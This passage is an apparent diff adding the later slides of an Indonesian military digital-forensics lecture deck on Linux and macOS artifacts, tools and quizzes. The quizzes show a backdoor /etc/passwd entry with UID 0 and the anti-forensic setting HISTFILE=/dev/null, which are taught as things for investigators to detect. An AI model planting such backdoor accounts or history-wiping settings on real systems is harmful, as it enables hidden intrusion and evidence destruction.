+                        <td><strong>Copy-on-Write</strong></td>
+                        <td>Data baru di lokasi baru</td>
+                        <td class="text-success">Versi lama mungkin masih ada</td>
+                    </tr>
+                    <tr class="fragment">
+                        <td><strong>Snapshots</strong></td>
+                        <td>Snapshot otomatis</td>
+                        <td class="text-success">Recovery data historis</td>
+                    </tr>
+                    <tr class="fragment">
+                        <td><strong>Native Encryption</strong></td>
+                        <td>Enkripsi per-volume/file</td>
+                        <td class="text-red">Tantangan akses data</td>
+                    </tr>
+                    <tr class="fragment">
+                        <td><strong>Nanosecond TS</strong></td>
+                        <td>Presisi timestamp tinggi</td>
+                        <td class="text-success">Timeline lebih akurat</td>
+                    </tr>
+                </table>
+            </section>
+
+            <!-- ==================== SLIDE 32: MACOS ARTIFACTS ==================== -->
+            <section>
+                <h2>🔎 Artefak Utama Mac OS</h2>
+                <div class="grid-2x2 medium-text">
+                    <div class="fragment step-box">
+                        <strong>📋 Plist Files</strong><br>
+                        <span class="small">Format konfigurasi utama (setara Registry Windows). Lokasi: <code>~/Library/Preferences/</code>. Format: binary (bplist) atau XML.</span>
+                    </div>
+                    <div class="fragment step-box">
+                        <strong>🔦 Spotlight</strong><br>
+                        <span class="small">Mengindeks semua file — nama, path, metadata, konten teks, EXIF. Database: <code>/.Spotlight-V100/</code></span>
+                    </div>
+                    <div class="fragment step-box">
+                        <strong>📊 FSEvents</strong><br>
+                        <span class="small">Mencatat setiap perubahan filesystem. File terhapus tetap tercatat! Lokasi: <code>/.fseventsd/</code></span>
+                    </div>
+                    <div class="fragment step-box">
+                        <strong>📝 Unified Logs</strong><br>
+                        <span class="small">Logging terpusat (binary). Baca: <code>log show</code>. Lokasi: <code>/var/db/diagnostics/</code></span>
+                    </div>
+                </div>
+            </section>
+
+            <!-- ==================== SLIDE 33: FSEVENTS VALUE ==================== -->
+            <section>
+                <h2>📊 FSEvents — Nilai Forensik Tinggi</h2>
+                <div class="two-columns medium-text">
+                    <div>
+                        <div class="box-success">
+                            <h4>✅ Keunggulan</h4>
+                            <ul class="small">
+                                <li>Mencatat file yang sudah dihapus</li>
+                                <li>Log persistent meski file hilang</li>
+                                <li>Timeline lengkap filesystem</li>
+                                <li>Mencakup USB drive activity</li>
+                            </ul>
+                        </div>
+                    </div>
+                    <div>
+                        <div class="box-warning">
+                            <h4>⚠️ Keterbatasan</h4>
+                            <ul class="small">
+                                <li>Tidak menyimpan konten file</li>
+                                <li>Root dapat menghapusnya</li>
+                                <li>Granularitas kasar</li>
+                                <li>Terhapus saat disk penuh</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+                <div class="fragment box-info content-margin">
+                    <strong>💡 Tool:</strong> <code>FSEventsParser</code> (Python, open-source) untuk parsing FSEvents logs
+                </div>
+            </section>
+
+            <!-- ==================== SLIDE 34: LINUX VS MACOS ==================== -->
+            <section>
+                <h2>⚔️ Perbandingan: Linux vs Mac OS</h2>
+                <table class="small">
+                    <tr>
+                        <th>Aspek</th>
+                        <th>Linux</th>
+                        <th>Mac OS</th>
+                    </tr>
+                    <tr class="fragment">
+                        <td>Filesystem</td>
+                        <td>ext4, XFS, Btrfs</td>
+                        <td>APFS, HFS+</td>
+                    </tr>
+                    <tr class="fragment">
+                        <td>User data</td>
+                        <td><code>/home/user/</code></td>
+                        <td><code>/Users/username/</code></td>
+                    </tr>
+                    <tr class="fragment">
+                        <td>Config format</td>
+                        <td>Text files</td>
+                        <td>plist (binary/XML)</td>
+                    </tr>
+                    <tr class="fragment">
+                        <td>Logging</td>
+                        <td>syslog + journald</td>
+                        <td>Unified Logs</td>
+                    </tr>
+                    <tr class="fragment">
+                        <td>Scheduled tasks</td>
+                        <td>cron, systemd timers</td>
+                        <td>launchd (plist-based)</td>
+                    </tr>
+                    <tr class="fragment">
+                        <td>FS events</td>
+                        <td>inotify (runtime only)</td>
+                        <td>FSEvents (persistent)</td>
+                    </tr>
+                    <tr class="fragment">
+                        <td>Encryption</td>
+                        <td>dm-crypt/LUKS</td>
+                        <td>FileVault (APFS native)</td>
+                    </tr>
+                </table>
+            </section>
+
+            <!-- ==================== SLIDE 35: MACOS CHALLENGES ==================== -->
+            <section>
+                <h2>⚠️ Tantangan Forensik Mac OS</h2>
+                <ol class="medium-text">
+                    <li class="fragment"><strong>FileVault encryption</strong> — APFS native encryption tanpa password/recovery key</li>
+                    <li class="fragment"><strong>T2/M-series chip</strong> — Hardware security membatasi boot eksternal</li>
+                    <li class="fragment"><strong>Proprietary formats</strong> — plist binary, APFS, unified logs</li>
+                    <li class="fragment"><strong>Closed ecosystem</strong> — Dokumentasi internal terbatas</li>
+                    <li class="fragment"><strong>Tool availability</strong> — Lebih sedikit dan sering berbayar</li>
+                </ol>
+                <div class="fragment box-info content-margin">
+                    <strong>Dalam konteks militer Indonesia:</strong> Mayoritas infrastruktur TNI menggunakan Windows/Linux, sehingga kapabilitas forensik Mac OS masih perlu dikembangkan
+                </div>
+            </section>
+
+            <!-- ==================== SLIDE 36: MACOS TOOLS ==================== -->
+            <section>
+                <h2>🛠️ Tools Forensik Mac OS</h2>
+                <table class="small">
+                    <tr>
+                        <th>Tool</th>
+                        <th>Tipe</th>
+                        <th>Fungsi</th>
+                    </tr>
+                    <tr class="fragment">
+                        <td><strong>mac_apt</strong></td>
+                        <td>Open-source</td>
+                        <td>Parser artefak macOS</td>
+                    </tr>
+                    <tr class="fragment">
+                        <td><strong>APOLLO</strong></td>
+                        <td>Open-source</td>
+                        <td>Apple Pattern of Life analysis</td>
+                    </tr>
+                    <tr class="fragment">
+                        <td><strong>plistutil</strong></td>
+                        <td>Open-source</td>
+                        <td>Parser plist (cross-platform)</td>
+                    </tr>
+                    <tr class="fragment">
+                        <td><strong>FSEventsParser</strong></td>
+                        <td>Open-source</td>
+                        <td>Parser FSEvents logs</td>
+                    </tr>
+                    <tr class="fragment">
+                        <td><strong>Autopsy</strong></td>
+                        <td>Open-source</td>
+                        <td>Analisis APFS dasar</td>
+                    </tr>
+                </table>
+            </section>
+
+            <!-- ==================== SLIDE 37: QUIZ 1 ==================== -->
+            <section>
+                <h2>🧠 Quiz Time!</h2>
+                <p><strong>Pertanyaan 1:</strong></p>
+                <p>Entry berikut di /etc/passwd adalah indikator apa?<br><code>sysbackup:x:0:0::/tmp:/bin/bash</code></p>
+                <div class="quiz-option fragment" data-fragment-index="1">A. Service account normal</div>
+                <div class="quiz-option fragment quiz-correct" data-fragment-index="2">B. Backdoor account ✅</div>
+                <div class="quiz-option fragment" data-fragment-index="3">C. Backup script user</div>
+                <div class="quiz-option fragment" data-fragment-index="4">D. Temporary user</div>
+                <p class="fragment small box-info">💡 UID 0 selain root + home di /tmp = sangat mencurigakan!</p>
+            </section>
+
+            <!-- ==================== SLIDE 38: QUIZ 2 ==================== -->
+            <section>
+                <h2>🧠 Quiz Time!</h2>
+                <p><strong>Pertanyaan 2:</strong></p>
+                <p>File .bash_history berukuran 0 byte. Kemungkinan penyebab UTAMA?</p>
+                <div class="quiz-option fragment" data-fragment-index="1">A. Akun baru belum digunakan</div>
+                <div class="quiz-option fragment quiz-correct" data-fragment-index="2">B. Penghapusan jejak (anti-forensik) ✅</div>
+                <div class="quiz-option fragment" data-fragment-index="3">C. Bug pada bash shell</div>
+                <div class="quiz-option fragment" data-fragment-index="4">D. Disk penuh</div>
+                <p class="fragment small box-warning">⚠️ Periksa .bashrc untuk <code>HISTFILE=/dev/null</code> dan gunakan <code>stat</code> untuk cek timestamps!</p>
+            </section>
+
+            <!-- ==================== SLIDE 39: QUIZ 3 ==================== -->
+            <section>
+                <h2>🧠 Quiz Time!</h2>
+                <p><strong>Pertanyaan 3:</strong></p>
+                <p>Artefak Mac OS yang mencatat perubahan filesystem termasuk file yang sudah dihapus adalah?</p>
+                <div class="quiz-option fragment" data-fragment-index="1">A. Spotlight</div>
+                <div class="quiz-option fragment" data-fragment-index="2">B. Unified Logs</div>
+                <div class="quiz-option fragment quiz-correct" data-fragment-index="3">C. FSEvents ✅</div>
+                <div class="quiz-option fragment" data-fragment-index="4">D. Plist files</div>
+                <p class="fragment small box-info">💡 FSEvents mencatat create/modify/delete — jejak tetap ada meski file dihapus!</p>
+            </section>
+
+            <!-- ==================== SLIDE 40: QUIZ 4 ==================== -->
+            <section>
+                <h2>🧠 Quiz Time!</h2>
+                <p><strong>Pertanyaan 4:</strong></p>
+                <p>Perintah untuk mencari semua akun dengan UID 0 (hak root) di Linux?</p>
+                <div class="quiz-option fragment" data-fragment-index="1">A. <code>cat /etc/shadow | grep root</code></div>
+                <div class="quiz-option fragment" data-fragment-index="2">B. <code>find / -uid 0 -type f</code></div>
+                <div class="quiz-option fragment quiz-correct" data-fragment-index="3">C. <code>awk -F: '$3 == 0 {print}' /etc/passwd</code> ✅</div>
+                <div class="quiz-option fragment" data-fragment-index="4">D. <code>grep "root" /etc/passwd</code></div>
+                <p class="fragment small box-info">💡 Option D hanya mencari kata "root", bukan UID 0 — bisa miss backdoor account!</p>
+            </section>
+
+            <!-- ==================== SLIDE 41: SUMMARY ==================== -->
+            <section>
+                <h2>📝 Ringkasan</h2>
+                <table class="small">
+                    <tr>
+                        <th>Konsep</th>
+                        <th>Poin Kunci</th>
+                    </tr>
+                    <tr>
+                        <td><strong>FHS</strong></td>
+                        <td>/var/log, /etc, /home, /tmp — prioritas forensik tertinggi</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Timestamps</strong></td>
+                        <td>atime, mtime, ctime, crtime (ext4) — gunakan <code>stat</code></td>
+                    </tr>
+                    <tr>
+                        <td><strong>User Artifacts</strong></td>
+                        <td>/etc/passwd, /etc/shadow — UID 0 selain root = red flag</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Bash History</strong></td>
+                        <td>.bash_history — artefak emas; waspada anti-forensik</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Log Analysis</strong></td>
+                        <td>auth.log, syslog; grep/awk/journalctl</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Persistence</strong></td>
+                        <td>Cron, systemd timers, SSH keys, LotL techniques</td>
+                    </tr>
+                    <tr>
+                        <td><strong>Mac OS</strong></td>
+                        <td>APFS, plist, FSEvents, Unified Logs</td>
+                    </tr>
+                </table>
+            </section>
+
+            <!-- ==================== SLIDE 42: NEXT WEEK ==================== -->
+            <section>
+                <h2>📅 Pertemuan Berikutnya</h2>
+                <div class="box-info">
+                    <h3>Pertemuan 08: UJIAN TENGAH SEMESTER (UTS)</h3>
+                </div>
+                <ul class="medium-text">
+                    <li class="fragment"><strong>Cakupan:</strong> Pertemuan 1-7</li>
+                    <li class="fragment"><strong>Ujian Teori (50%):</strong> Essay dan pilihan ganda — 90 menit</li>
+                    <li class="fragment"><strong>Ujian Praktik (50%):</strong> Studi kasus investigasi forensik — 120 menit</li>
+                </ul>
+                <div class="fragment box-warning content-margin">
+                    <strong>⚠️ Persiapkan diri dengan baik!</strong> Pelajari kembali seluruh materi Pertemuan 1-7
+                </div>
+            </section>
+
+            <!-- ==================== SLIDE 43: REFERENCES ==================== -->
+            <section>
+                <h2>📚 Referensi</h2>
+                <ol class="small">
+                    <li>Casey, E. (2022). <em>Digital Evidence and Computer Crime</em> (4th Ed.). Academic Press. <strong>Chapter 10</strong></li>
+                    <li>Phillips, A., et al. (2022). <em>Guide to Computer Forensics and Investigations</em> (6th Ed.). Cengage. Chapter 9.</li>
+                    <li>Nikkel, B. (2021). <em>Practical Forensic Imaging</em> (2nd Ed.). No Starch Press. Chapter 9-10.</li>
+                    <li>Altheide, C. & Carvey, H. (2011). <em>Digital Forensics with Open Source Tools</em>. Chapter 4-5.</li>
+                    <li>Linux LEO: <a href="https://linuxleo.com/">https://linuxleo.com/</a></li>
+                </ol>
+            </section>
+
+            <!-- ==================== SLIDE 44: CLOSING ==================== -->
+            <section class="center">
+                <h1>Terima Kasih</h1>
+                <h3>🔍 Forensik Digital untuk Keperluan Militer</h3>
+                <p>Pertemuan 07: Forensik Linux dan Pengenalan Mac OS</p>
+                <br>
+                <p class="small">Ada pertanyaan?</p>
+            </section>
+
+        </div>
+    </div>
+
+    <!-- Reveal.js Scripts -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/reveal.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/plugin/highlight/highlight.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/plugin/notes/notes.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/4.5.0/plugin/math/math.min.js"></script>
+    
+    <script>
+        Reveal.initialize({
+            hash: true,
+            slideNumber: 'c/t',
+            showSlideNumber: 'all',
+            transition: 'slide',
+            transitionSpeed: 'default',
+            backgroundTransition: 'fade',
+            pdfSeparateFragments: false,
+            plugins: [ RevealHighlight, RevealNotes, RevealMath.KaTeX ]
+        });
+    </script>
+</body>
+</html>
